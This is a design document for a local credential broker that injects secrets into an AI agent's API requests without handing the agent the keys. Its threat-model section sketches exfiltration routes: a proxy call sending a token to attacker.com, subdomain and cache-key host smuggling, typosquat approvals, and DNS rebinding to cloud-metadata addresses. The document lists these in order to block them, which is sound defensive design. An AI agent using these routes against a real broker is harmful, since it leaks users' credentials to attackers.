# SafeClaw Credential Broker — routing & injection (design, LOCKED 2026-07-01)

> **Status: LOCKED.** Converged after 3 independent red-teams (security / adoption / codebase) + resolution. Implement in **two additive stages (v1 → v2)**; the design is frozen — build, don't re-litigate.
> **Mechanism-only** — positioning/competitive/market strategy lives in the PRIVATE `safeclaw-pro-backend/docs/STRATEGY.md`, never here.
> Grounded in: [CONNECTIONS_AND_AUTH.md](./CONNECTIONS_AND_AUTH.md), [SERVICES.md](./SERVICES.md), [STORES_AND_ITEMS.md](./STORES_AND_ITEMS.md), [PROTOCOL.md](./PROTOCOL.md) §6, [STREAMING_APPROVAL.md](./STREAMING_APPROVAL.md).

Legend: **[built]** in the tree · **[v2]** roadmap. (No mid-tier — v1 = package what's built; v2 = the complete design, additive.)

> **v1 SHIPPED to `dev` 2026-07-01 (v1.0.29, build-verified; LIVE-e2e pending):** `/export` off the agent surface (403), distinct `423 vault_locked`, connect-agent modal self-provisions the key, skill field-name casing, OAuth `needs_reauth` console signal. **v2 build plan (the HOW, code-grounded + sequenced): [CREDENTIAL_BROKER_V2_BUILD.md](./CREDENTIAL_BROKER_V2_BUILD.md).**

---

## 1. TL;DR — two additive stages (read this first)

The sound, differentiated core is the **recipe path, which already exists**. Ship it, get feedback, then add the powerful-but-risky parts (per-secret anchor, passthrough, MITM) **as a pure superset — no rework of v1**.

**v1 — package what already works (days; no silent-exfil holes):**
- The shipped **recipe path**: `/use` + `/stream` + registry + `{{secret.X | b64|basic}}` filters + connection layer + captive-portal approval. **All [built].**
- **Cold-start = TWO paths to first value (both ≤5 min, both converge on `/use`); only the secret-into-vault channel differs:**
  - **Novice (agent + web only, NO CLI):** user tells the agent *"put X's key in my vault"* → agent points to the console (v1) / deep-link (v2) → user pastes the secret + one passkey **in the browser** → agent calls `/use/<curated-service>`. The agent never holds the secret; the human enters it in web. **Web is the universal floor — a novice never touches `sc`.**
  - **Dev (CLI):** `sc set <secret> <value>` → `/use/<curated-service>`. `sc set` writes only a raw secret (creates **no** connection); the curated default connection is implicit (`connection_id == service_id`).
  - Both v1 paths target a **curated** service (arbitrary/raw APIs = v2). The agent orchestrates; the human anchors (web paste + passkey, or `sc set`).
- **The agent's one concept in v1 = the shipped `/use/<connection>` model** (registry-discovered). **Do NOT rewrite the skill toward phantoms yet.**
- Edge: curated recipes + **residue-free `/stream` git** + passkey self-custody + cloud-blind.

**v2 — the complete design (additive superset, built incrementally):**
- **Host anchor on the CONNECTION layer** (§7 — ONE host concept, no new field): curated connection's egress host is **fixed by the recipe** (url literal, or `config.host` for a self-hosted slot) = already the anchor; a **raw secret = a degenerate connection** (`service: ""`) that **reuses `config.host`** as its anchor.
- **Passthrough**: `/proxy` (generic) + **connection-qualified `__conn.role__` phantom** (resolves to the connection → its `resolved_hosts` + secret) + MITM/`sc run`. An arbitrary raw API needs an explicit degenerate connection (`sc connect`/console/deep-link) — separate from `sc set`.
- **Additive refactor** (§4), `sc status` discovery shape (§9), MCP ingress, agent-authored recipes (merge `feat/per-vault-custom-recipes` first), deep-link handoff.

> **⛔ HARD ORDERING RULE (intra-v2):** never let a passthrough ingress (`/proxy`, phantom, MITM) go live before **all three** land: host-anchor enforcement + exact-host (FQDN) match + host in the passthrough approval-cache key. These are **passthrough requirements, not current bugs** (the recipe path is host-safe without them — §11). *(DNS-pin is an optional hardening, not a gate — §11.)*
>
> **v1 → v2 is purely incremental:** the connection layer already exists (implicit default connections for curated services); v2 only **adds** raw/passthrough connections (`service: ""` + `config.host`) + passthrough routes + `resolved_hosts` enforcement on the existing shapes. No new fields, no rework.

---

## 2. What it is (one paragraph)

Give an agent the **use** of a credential without letting it **hold** the credential. On the recipe path (v1) the agent calls `/use/<connection>/<path>`; the daemon knows the URL + auth + policy, injects the real secret at egress, forwards. On the passthrough path (v2) the agent uses a **connection-qualified placeholder** and the daemon substitutes it, bounded by the connection's `resolved_hosts` (§7). The local, cloud-blind daemon is the only thing that ever sees the real value.

## 3. The mental model: two orthogonal axes over one core

| | **Fill = recipe** (curated) | **Fill = raw phantom** (direct) |
|---|---|---|
| **Transport = explicit** | `/use/<conn>` **[v1, built]** | `POST /proxy` (conn-qualified) **[v2]** |
| **Transport = MITM** | host→recipe **[v2]** | substitute by conn.role **[v2]** |

Fill = how the credential is injected; Transport = how the request reaches the daemon. They compose. **v1 exercises only the top-left (recipe × explicit) — built and sound.** The agent only ever makes the Fill choice (*"connection exists? → `/use`"*); MITM is the human's opt-in.

## 4. The core (transport-neutral, already built) + additive refactor

`src/server/broker.rs` is **already transport-neutral in its types** (domain `Operation` → `BrokerResponse`, no axum types); `/use` + `/stream` are already adapters. **[built]**

**Refactor is ADDITIVE — respect the existing, long-validated 2-RTT flow; do NOT rewrite `approve.rs`.** The ceremony is inherently two legs across two handlers:
- `Ingress::shape(self) -> BrokerRequest` (extract shaping)
- `broker::decide(req) -> {Forward (allow+cache-hit only) | NeedsApproval(OpHandle) | Deny}` — leg 1 (`/use` today returns `202 pending`)
- `broker::execute(op, grant_ctx) -> BrokerResponse` — leg 2 (post-passkey: forward + one-shot `Consumed` + cache write), stays where it is.

## 5. Transport axis

- **`/use/<conn>/<path>`** — recipe-backed. **[v1, built]**
- **`/stream/<conn>/<path>`** — streaming passthrough (git smart-HTTP, SSE). **[v1, built]** It **already approves per policy** (captive-portal + service-level floor). It uses a *coarser* policy than `/use`'s per-path rules — **this is fine and intentional** (git is a byte stream; per-path rules don't map). Unifying the two policy engines is **optional, not required**.
- **`POST /proxy`** — generic; body `{url, method, headers, body}` with a connection-qualified phantom. **[v2]** Body == future MCP tool schema. **Gated by §1.**
- **MITM + `sc run` env-CA** — transparent interception for dumb subprocess CLIs. **[v2]** Silent + child-scoped. **Escalation ladder** (prefer residue-free): ① agent HTTP → `/use`|`/proxy`; ② per-command override (`git clone <…/stream/…>`, `npm --registry`, `pip -i`) — covers common dumb CLIs with **zero `sc run`**; ③ recipe/`/use`; ④ only a hardcoded-URL + env-cred CLI with no cheap route → suggest `sc run` once (record in a manifest, don't re-nag).
- **MCP** — one more ingress later; DX sugar, not the front door. **[v2]**

## 6. Fill axis

- **Recipe** (`service.toml`) — authoritative injection template: `{{secret.X}}` + filters, per-path `[policy.rules]`, OAuth via `[provider]`. **[built]**
- **`{{secret.X | b64}}` / `{{secret.X | basic}}` pipe filters — [built]** (15 render tests).
- **Raw phantom** — degenerate case of the template (direct insertion). **[v2]** New `__…__` delimiter (disjoint from `{{…}}`). On the passthrough path it is **connection-qualified** (`__github-work.api_key__`); bare names are rejected when >1 connection could match.

**Auth = two classes:** ① **Insertion** (bearer/apikey/query/URL/Basic) — insert, optionally with an egress filter; the vault stores the **semantic** value, the filter encodes at egress (never pre-store the encoded form). ② **Derivation/exchange** (HMAC/SigV4/OAuth1; **OAuth2** refresh→access) — daemon-side signer/minter, **recipe irreducible** (OAuth2 [built]; SigV4/HMAC reserved [v2]).

- **base64 pitfall:** a dumb tool that base64's `user:__phantom__` itself buries the phantom → route filtered/computed auth through the **recipe** path (git: `/stream/github-git` injects `Basic {{secret.github_token | basic}}`).
- **Divergence impossible** via **replace-all-matching** (broker.rs:908-930): a declared slot → recipe wins (agent header stripped); else name-keyed.

## 7. Schema — grounded in the SHIPPED connection layer (LOCKED)

Connections are **already implemented + shipped** (spec `CONNECTION_SCHEMA.md`; `src/storage/plaintext.rs:76`, `VaultAux.connections`, routed via `state.rs resolve_connection_service`, cache keyed by `connection_id`). **v1 uses them AS-IS — no schema change.** The SHIPPED struct:

```rust
// src/storage/plaintext.rs — the shipped Connection (do not invent fields)
pub struct Connection {
    pub service: String,                     // recipe TYPE id it instantiates (many connections per service). Field is `service`, NOT `recipe`.
    pub config:  BTreeMap<String, String>,   // recipe-declared re-map slots ONLY (e.g. `host` for a self-hosted upstream); anti-SSRF; omitted when none
}
// secret VALUES: stores["native-secrets"].items["<conn>:<role>"]  (bare name when conn==service, else <conn>:<role>)
```

**There is ONE host concept and it ALREADY EXISTS — do NOT add `allowed_hosts` or `hosts` fields** (both were dropped; they are not in the shipped design):
- **curated, fixed host** → the recipe url literal. Per CONNECTION_SCHEMA.md §4 the egress host is **FIXED by the recipe** — a connection can NEVER re-point it (anti-SSRF). **Already the anchor.**
- **curated, self-hosted** → `config.host` fills the recipe's declared `{{connection.host}}` slot → the rendered host is the anchor.
- **raw / passthrough [v2]** → no recipe; **reuse `config.host`** (a connection with `service: ""`): that host IS the anchor. No new field.

```
resolved_hosts(conn) =  conn.service names a recipe ?  render(recipe.upstream[*].url, conn.config) → host   // existing host-literal + host_egress_allowed path
                                                     :  conn.config.host                                     // raw / passthrough
enforce:  egress host ∈ resolved_hosts(conn)   (EXACT FQDN)
```

- **Curated is anchored TODAY** (`upstream_host_has_unsafe_template` + `host_egress_allowed`); **no new storage.**
- **The only v2 add** = allow a connection with `service: ""` + `config.host` (a raw/passthrough connection), and enforce `resolved_hosts` on the passthrough route.
- **Passthrough phantom `__conn.role__`** → the connection → its `resolved_hosts` + which secret (name→connection via the connection layer — no new index).
- Multi-host raw (rare) → use a curated recipe (which lists all its hosts); a raw connection is single-host (`config.host`).
- **`host` stays inside `config` (NOT promoted to a first-class `Connection.host` field):** it is one recipe-declared re-map slot among possibly several (`host`/`subdomain`/…); the template engine reads all `{{connection.X}}` from `config` uniformly (broker.rs:188) and the recipe's `params` allowlist governs it (anti-SSRF). Promoting it would split the render source for no functional gain (`resolved_hosts()` already abstracts the anchor). Revisit only if `host` ever needs distinct typing/structure (host+port+scheme, or a list).

## 8. Host-anchor UX — who sets the connection's host (never hand-typed) [v2]

1. **Curated recipe declares it** — zero input; multi-host correct (github.com + api.github.com + githubusercontent.com).
2. **Agent proposes → human confirms via deep-link** `{{console}}/…/secrets/new?name=…&hosts=…` — hints prefilled, user pastes only the **value** + one passkey. **Value never in URL.**
3. **Manual / TOFU** — no baked hint list; start deny; first unmatched host → **one-tap-widen**: a captive-portal approval that writes an **EXACT host**. Because it's a **permanent grant**, it's a **distinct, higher-friction UX** (show host + eTLD+1, cooldown), **not** the ordinary one-tap approve. If widen slips, ship enforcement in **warn/log mode** first (record, don't deny). **Exact FQDN only — never auto-widen to a bare eTLD+1** (shared-suffix hosts leak).

## 9. Agent mental model + discovery

- **v1:** one concept = **"connection exists → `/use/<connection>`"** (registry-discovered). One story only.
- **v2:** the phantom concept + a proper **`sc status` agent-discovery shape** `{secrets:[{name,anchored_host}], call_here, under_sc_run}` (today `sc status` is a human check; `/registry` returns `services`/`connected` — neither is this shape). **Preflight:** before a phantom-dependent dumb CLI, check `under_sc_run`; if not routed, explain ("needs `sc run`") instead of hitting a mysterious 401. Distinctive phantom string (`sc__…__`) = a recognizable un-substituted-leak breadcrumb.

## 10. Onboarding

Principles: ① min USER load; ② then AGENT load; ③ state via **discovery**, not a decision tree; ④ **drop edge scenarios** for cleanliness.
- **Skill GENERIC** (the one concept + "call the registry; never hold raw secrets"); per-service config → recipe `[setup]` + registry.
- **Install prompt = one-time bootstrap** (goal + anchors, not commands).
- **Dropped edges:** (1) auto-covering a running agent → `sc run` or explicit; (2) persistent GLOBAL base-URL rewrite → per-command only (git `/stream`) + MITM; (3) early sudo system-trust CA. (git/npm/cargo are core; only the *dirty persistent mechanism* is dropped.)
- **Clean removal = a per-project manifest**, not agent memory.

## 11. Security — the recipe path is sound; the passthrough gate

**Recipe path (v1) is SOUND** (verified): host is a literal / declared `{{connection.x}}` (`upstream_host_has_unsafe_template`), `{{secret.*}}` in an authority rejected, connection re-map can't repoint an audited host, replace-all-matching strips agent auth. `/export` off the agent surface + OAuth curated-only remove the raw-exfil + confidential-secret paths. **⇒ v1 has no silent-exfil holes.**

**Passthrough path (v2) — THREE hard gates before it goes live** (§1 ordering; passthrough requirements, **not current bugs**):
1. **Host-anchor enforcement** (§7 `resolved_hosts`) — else `POST /proxy {url: attacker.com, …__token__}` forwards the real token with no approval (today `host_egress_allowed` permits every public host). [silent]
2. **Exact-host (FQDN)** — else `*.github.io`/`*.vercel`/tenant subdomains exfiltrate. [silent]
3. **Host in the passthrough approval-cache key** — today the key is `(conn, rule, method)`; safe for `/use` (host recipe-fixed), but on `/proxy` the host is request-data → approve host A, smuggle host B within TTL. Add the resolved host to the key. (Connection-scoping bounds this to the connection's human-anchored `resolved_hosts`; mainly matters for multi-host connections.) [silent]

**Also required for passthrough (ship with it, not separate "gates"):**
- **One-tap-widen = higher-friction + exact-host** (§8) — else one habituated tap persists a permanent attacker-host anchor (typosquat), thereafter silent.
- **Connection-qualified phantoms `__conn.role__`** (§7) — bare names are ambiguous across multi-account connections; reject bare names when >1 connection matches; render the resolved connection + scope in approval/audit.

**Optional hardening (NOT a gate):** **DNS-pin on the resolved IP** — rebinding can flip an anchored name to `169.254.169.254`/internal at connect time (guard checks the name; `reqwest` re-resolves). Its value = reaching **internal/cloud-metadata** IPs behind a name-based block — a **hosted/shared-daemon** concern, **not** the **local** daemon (a local agent can reach localhost/LAN directly anyway; the cloud daemon is being retired). **Low priority; add only if a hosted/shared daemon is reintroduced.**

**Honest posture:** even fully built, the human anchor is defeatable by **habituation** (true of all human-approval security). The claim = "agent never holds the key + host-anchored egress + human confirms new destinations" = **strictly better than status quo** (agent holds raw key, sends anywhere silently), not "unbreakable." The real defense = keep widen prompts **rare + salient** (default to curated/correct hosts).

## 12. Known risks / open (don't re-litigate)

- **Human anchor is habituation-defeatable** — inherent; mitigate with rarity + proportional friction (§11).
- **Passthrough ordering** — §1 gate; the recipe path is safe without it (items are v2 requirements, not current bugs).
- **`/use` vs `/stream` policy asymmetry** — intentional (byte stream); unify only if desired, not required (§5).
- **`broker` refactor is additive**, not a rewrite — `decide`/`execute` respect the existing 2-RTT flow (§4).
- **ONE host concept on the connection** (§7): curated = recipe-fixed (url literal / `config.host` slot); raw = reuses `config.host` — **no new field**, no `allowed_hosts`/`hosts`, no side-table, no per-item bytes/sudp change.
- **Agent-authored recipe correctness** — v1/v2 scope agent-authored recipes to **insertion auth + human-anchored host** (verifiable); OAuth/signing = **curated-only** (a non-expert can't audit a subtly-wrong OAuth recipe; also avoids `client_secret`-marked-public leak). `client_type=public` stays a validator gate.
- **Anchor bounds destination, not action** — a raw secret can hit any path on its allowed host (no path scope without a recipe); equivalent to the user holding the token.
- **Coverage gaps (accepted):** cert-pinned dumb CLIs; non-REST (gRPC/websocket/byte-signed) beyond `/stream`.

## 13. Build order

**v1 (package + polish what's built):** productize `/use`+`/stream`+registry+filters; polish BOTH cold-start paths (novice: agent→web console paste+passkey→`/use`; dev: `sc set`→`/use`) into a ≤5-min first win — web is the universal floor, a novice never touches `sc`; keep the skill on the `/use` model.
**v2 (additive superset, gated by §1):** host anchor on the connection (`config.host` for raw / recipe-fixed for curated) + `resolved_hosts` enforcement (exact-host) → `/proxy` + connection-qualified `__conn.role__` + host-in-passthrough-cache-key → MITM/`sc run` → additive `decide`/`execute`+`Ingress` refactor → `sc status` discovery shape → MCP → agent-authored recipes (merge `feat/per-vault-custom-recipes` first) → deep-link. *(DNS-pin = optional hardening, not gated — §11.)*

**v1 → v2 is purely incremental** (no rework): the connection layer already exists (implicit default connections for curated services); v2 adds raw connections (`service: ""` + `config.host`) + passthrough routes + `resolved_hosts` enforcement on existing shapes — no new fields. Design once, implement/test in two stages, drive fast to complete v2.

## 14. Vision — agent-as-integrator (post-v1)

User tells the agent *"put service X's API in my vault"*; the agent researches it, proposes a (degenerate or full) connection **+ its host (`config.host`)** via the deep-link, human **anchors with one passkey**; the agent never holds the raw secret. Everything is a (degenerate) connection/recipe. The human-passkey gate on a secret→host binding **is** the trust anchor. Foundation: `feat/per-vault-custom-recipes` (unmerged, 1 commit; `aux.recipes` absent from `dev`). Gap: the agent-facing author path (deposit → passkey approve), scoped to insertion-auth.

## 15. Decided NOT to do (don't re-litigate)

- **No passthrough (`/proxy`/phantom/MITM) before the three §11 gates.**
- **No separate `allowed_hosts`/`hosts` field, no side-table, no per-item bytes change** — ONE host concept on the connection (raw = degenerate connection reusing `config.host`; curated = recipe-fixed).
- **No promoting `host` to a first-class `Connection.host` field** — it stays a `config` re-map slot (uniform with the `{{connection.X}}` template mechanism + recipe `params` anti-SSRF); `resolved_hosts()` abstracts enforcement. Revisit only if host needs structured/validated typing.
- **No eTLD+1 host matching** — exact FQDN; only curated recipes declare multi-host.
- **No `broker.rs`/`approve.rs` rewrite** — additive `decide`/`execute` respecting the existing flow.
- **No forced `/use`↔`/stream` policy unification** — the coarser stream policy is intentional.
- **No MITM-as-primary / no forcing `sc run`** — explicit baseline; MITM opt-in, v2.
- **No persistent GLOBAL base-URL rewrite** — per-command explicit + MITM only.
- **No pre-storing encoded credential forms** — semantic value + egress filter.
- **No baked "common host" hint list** — recipe / agent deep-link / TOFU.
- **No agent-authored OAuth/signing recipes** — curated-only; agent-authored = insertion + human-anchored host.
- **No skill rewrite toward phantoms in v1** — v1's one concept is the shipped `/use` model.
- **No early sudo system-trust CA. No auto-covering already-running agents.**
- **Don't delete `/export`** — keep the op-path + human core act (`sc secret get`); disable the **agent surface** only. ✓ DONE: route → 403 stub (`env::disabled`), stripped from skill; `handle` preserved for opt-in re-enable. (Skill-strip alone wouldn't close it — the live route is itself the exfil hole, so the 403 is required for the "no silent-exfil holes" claim.)
- **No competitor references in this doc; novelty/paper = non-goal** — usability first.
